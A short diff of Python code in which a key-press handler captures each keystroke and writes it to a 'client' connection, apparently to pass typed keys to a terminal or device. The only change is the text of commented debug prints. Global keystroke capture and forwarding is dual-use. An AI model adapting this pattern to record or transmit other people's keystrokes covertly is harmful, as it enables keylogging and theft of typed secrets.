@@ -58,11 +58,11 @@ timestampAbsolute = False
 def on_press(key):
     try:
         k = key.char  # single-char keys
-        # print("single" + k)
+        # print("single: " + k)
         client.write(k.encode())
     except:
         k = key.name  # other keys
-        # print("other" + k)
+        # print("other: " + k)
         if k == "enter":
             client.write("\n".encode())
 
